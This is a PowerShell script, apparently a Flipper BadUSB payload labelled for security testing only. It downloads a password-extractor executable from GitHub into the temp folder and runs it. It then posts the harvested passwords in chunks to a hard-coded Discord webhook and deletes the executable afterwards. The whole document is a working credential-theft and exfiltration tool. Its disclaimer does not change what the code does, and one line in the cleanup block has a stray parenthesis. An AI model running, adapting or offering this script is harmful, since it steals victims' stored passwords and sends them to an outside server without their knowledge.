# Flipper Password Extractor Script
# For LEGITIMATE SECURITY TESTING ONLY

$webhookUrl = 'https://discord.com/api/webhooks/1369454757533454356/B2fwEhJqhY2nuEmIoQNaKFAzfe8VWkjHXzZmXFhKNCblp-xT-CgkoOPL6DEf-N4XXNZo'
$exeUrl = 'https://github.com/aran1910/FlipperPasswordExtractor/raw/refs/heads/master/build/password_extractor.exe'
$exePath = "$env:TEMP\password_extractor.exe"

try {
    # Download the extractor if not present
    if (-not (Test-Path -Path $exePath)) {
        Write-Host "[+] Downloading password extractor..." -ForegroundColor Yellow
        try {
            $ProgressPreference = 'SilentlyContinue'
            Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -ErrorAction Stop
            $ProgressPreference = 'Continue'
            Write-Host "[+] Download completed successfully" -ForegroundColor Green
        } catch {
            Write-Host "[!] Download failed: $_" -ForegroundColor Red
            exit 1
        }
    }

    # Execute the extractor
    Write-Host "[+] Running password extractor..." -ForegroundColor Yellow
    $output = & $exePath | Out-String
    
    if (-not $output) {
        Write-Host "[!] No output received from extractor" -ForegroundColor Red
        exit 1
    }

    # Split and send to Discord
    Write-Host "[+] Sending results to Discord..." -ForegroundColor Yellow
    $chunkSize = 2000  # Discord message limit
    $chunks = [Math]::Ceiling($output.Length / $chunkSize)
    
    for ($i = 0; $i -lt $chunks; $i++) {
        $start = $i * $chunkSize
        $length = [Math]::Min($chunkSize, $output.Length - $start)
        $content = $output.Substring($start, $length)
        
        $webhookContent = @{
            'username' = 'Flipper Password Extractor'
            'content' = $content
        }
        
        try {
            $jsonData = $webhookContent | ConvertTo-Json -Compress
            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonData -ContentType 'application/json' -ErrorAction Stop
            Write-Host "[+] Sent chunk $($i+1)/$chunks" -ForegroundColor DarkGray
            Start-Sleep -Milliseconds 500  # Rate limiting
        } catch {
            Write-Host "[!] Failed to send chunk $($i+1): $_" -ForegroundColor Red
        }
    }

    Write-Host "[+] All data sent successfully!" -ForegroundColor Green

} catch {
    Write-Host "[!] Error: $_" -ForegroundColor Red
} finally {
    # Cleanup
    if (Test-Path -Path $exePath)) {
        Remove-Item -Path $exePath -Force -ErrorAction SilentlyContinue
    }
}

# Keep window open to see results
Write-Host "Press any key to exit..." -ForegroundColor Gray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")